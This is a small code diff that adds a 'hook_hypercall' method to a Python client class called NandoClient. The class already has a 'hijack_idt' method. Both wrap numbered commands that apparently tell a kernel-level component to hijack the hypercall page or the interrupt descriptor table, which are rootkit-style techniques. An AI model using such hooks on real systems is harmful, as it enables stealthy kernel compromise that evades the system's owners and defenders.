@@ -75,6 +75,13 @@ class NandoClient:
             
         raise Exception("[-] Command timed out")
 
+    def hook_hypercall(self, hypercall_page_kva, hook_va):
+        """
+        Uses Command 0x09 for surgical Hypercall page hijacking.
+        """
+        status, _ = self.send_command(9, hypercall_page_kva, hook_va)
+        return status == 0
+
     def hijack_idt(self, idt_base, new_handler_va):
         """
         Uses Command 0x08 for surgical IDT hijacking.
